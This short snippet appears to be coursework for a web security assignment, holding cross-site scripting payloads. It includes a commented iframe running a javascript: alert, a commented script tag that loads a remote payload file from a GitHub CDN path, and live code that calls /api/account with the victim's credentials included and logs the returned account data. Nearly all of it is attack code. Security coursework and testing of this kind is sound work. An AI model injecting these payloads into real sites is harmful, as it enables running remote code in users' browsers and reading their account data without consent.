// simple xss test
{/* <iframe src="javascript:alert(`XSS success`)"></iframe> */}

// src xss
{/* <script src="https://cdn.jsdelivr.net/gh/lepong1st/FIT5003_A2@main/6b_payload.js"></script> */}
fetch("/api/account", {
    credentials: "include"
})
.then(response => {
    console.log("GET /api/account status:", response.status);
    return response.json();
})
.then(data => {
    console.log("Response:", data);
    document.body.dataset.requestMade = "true";
});